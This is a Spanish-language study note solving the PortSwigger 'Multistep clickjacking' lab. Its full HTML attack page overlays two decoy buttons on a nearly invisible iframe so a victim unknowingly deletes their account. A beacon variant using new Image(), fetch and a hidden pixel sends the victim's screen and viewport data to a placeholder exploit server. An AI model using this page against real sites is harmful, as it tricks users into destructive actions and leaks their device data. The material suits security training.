---
aliases:
  - Clickjacking - multistep delete account
tags:
  - vuln/clickjacking
  - example
  - portswigger
---

# Ejemplo — Multistep (borrar cuenta con confirmación)

> Lab: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep) · técnica → [[vulnerabilities/004-clickjacking/clickjacking|entry point]]

**Qué demuestra:**
- **Dos señuelos** posicionados manualmente: `Click me first` sobre *Delete account* y `Click me next` sobre el *Yes/confirm* → cubre un flujo de **dos clics**.
- **Beacon de layout** con `new Image()` que exfiltra `screen`/`inner*`/`dpr` al exploit server → los leés en el **Access log** para **recalcular los `top`/`left`** según la resolución de la víctima. Ver [[vulnerabilities/004-clickjacking/clickjacking#6) Beacon de resolución/layout (para alinear a ciegas)|PoC beacon]].

> Ajustá las coordenadas de `addText(...)` a la resolución real (las de acá, `10,490` y `170,290`, sirven de punto de partida). Para entregar, bajá la `opacity` del iframe.

```html
<!-- https://portswigger.net/web-security/clickjacking/lab-multistep -->
<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

/* Señuelos */
.overlay {
    position: absolute;
    z-index: 1;
    padding: 10px 20px;
    background: rgba(0,0,0,0.2);
    font-family: Arial;
    font-size: 20px;
    color: black;
    cursor: pointer;
}

/* Iframe */
iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    opacity: 0.4;   /* bajar a ~0.0001 para entregar */
    z-index: 2;
}
</style>

<body>
<script>
// Crear texto señuelo en X/Y
function addText(text, x, y) {
    const el = document.createElement("div");
    el.className = "overlay";
    el.textContent = text;
    el.style.left = x + "px";
    el.style.top = y + "px";
    document.body.appendChild(el);
}

// Beacon de layout de la víctima → leelo en el Access log del exploit server
(function () {
  const datos = {
    w: screen.width,  h: screen.height,
    aw: screen.availWidth, ah: screen.availHeight,
    vw: window.innerWidth, vh: window.innerHeight,
    dpr: window.devicePixelRatio || 1,
    cd: screen.colorDepth
  };
  const qs = Object.entries(datos)
    .map(([k, v]) => k + "=" + encodeURIComponent(v))
    .join("&");
  const img = new Image();
  img.src = "https://EXPLOIT.exploit-server.net/exploit?" + qs;
})();

// Posicionar señuelos manualmente (ajustar a la resolución de la víctima)
addText("Click me first", 10, 490);   // sobre "Delete account"
addText("Click me next", 170, 290);   // sobre "Yes"/confirm
</script>

<iframe
    src="https://TARGET.web-security-academy.net/my-account"
    sandbox="allow-top-navigation allow-forms"
    id="target_website">
</iframe>
</body>
```

## Variante — beacon con `fetch` + pixel oculto

Otra forma de exfiltrar la resolución (equivalente): un `fetch` al cargar + un `<img>` oculto de respaldo. Coordenadas de una calibración distinta (`382,551` / `549,316`):

```html
<script>
fetch(
  "https://EXPLOIT.exploit-server.net/exploit?resolution="
  + screen.width + "x" + screen.height
);
</script>
<!-- ...mismo addText()/estilos... -->
<img src="https://EXPLOIT.exploit-server.net/pixel?res=1920x1080" style="display:none">
```
